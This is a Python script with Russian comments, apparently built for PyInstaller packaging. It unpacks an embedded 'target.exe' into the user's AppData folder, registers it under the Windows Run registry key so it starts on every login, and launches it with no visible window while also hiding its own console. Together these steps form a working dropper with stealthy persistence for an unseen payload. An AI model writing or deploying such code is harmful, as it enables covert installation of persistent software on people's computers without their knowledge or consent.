import os
import sys
import winreg
import subprocess
import shutil
from importlib import resources

def get_resource_path(resource_name):
    """Получает путь к ресурсу, встроенному PyInstaller"""
    if hasattr(sys, '_MEIPASS'):
        # Если скрипт скомпилирован в .exe, используем временную папку PyInstaller
        return os.path.join(sys._MEIPASS, resource_name)
    else:
        # Если запускается как .py, ищем в текущей директории
        return resource_name

def copy_exe_to_target_dir():
    target_dir = os.path.expanduser("~/AppData/Roaming/MyCorporateApp")
    target_exe_path = os.path.join(target_dir, "target.exe")

    # Создаем директорию, если она не существует
    os.makedirs(target_dir, exist_ok=True)

    # Копируем встроенный target.exe в целевую директорию
    try:
        source_exe = get_resource_path("target.exe")
        if not os.path.exists(source_exe):
            raise FileNotFoundError(f"Встроенный файл target.exe не найден")
        shutil.copy2(source_exe, target_exe_path)
        return target_exe_path
    except Exception as e:
        print(f"Ошибка при копировании .exe: {str(e)}")
        sys.exit(1)

def add_to_startup(exe_path):
    try:
        # Открываем ключ реестра для автозагрузки
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0,
            winreg.KEY_SET_VALUE
        )
        # Добавляем запись в автозагрузку
        winreg.SetValueEx(
            key,
            "MyCorporateApp",
            0,
            winreg.REG_SZ,
            f'"{exe_path}"'
        )
        winreg.CloseKey(key)
        print("Программа добавлена в автозагрузку")
    except Exception as e:
        print(f"Ошибка при добавлении в автозагрузку: {str(e)}")
        sys.exit(1)

def run_exe_hidden(exe_path):
    try:
        # Запускаем .exe без видимого окна
        startupinfo = subprocess.STARTUPINFO()
        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        startupinfo.wShowWindow = subprocess.SW_HIDE
        subprocess.Popen(exe_path, startupinfo=startupinfo)
        print("Программа запущена в фоновом режиме")
    except Exception as e:
        print(f"Ошибка при запуске .exe: {str(e)}")
        sys.exit(1)

if __name__ == "__main__":
    # Скрываем консольное окно самого скрипта при запуске
    if hasattr(sys, 'frozen'):  # Проверяем, скомпилирован ли скрипт в .exe
        import ctypes
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

    # Копируем встроенный .exe в целевую директорию
    extracted_exe_path = copy_exe_to_target_dir()

    # Добавляем в автозагрузку
    add_to_startup(extracted_exe_path)

    # Запускаем .exe в фоновом режиме
    run_exe_hidden(extracted_exe_path)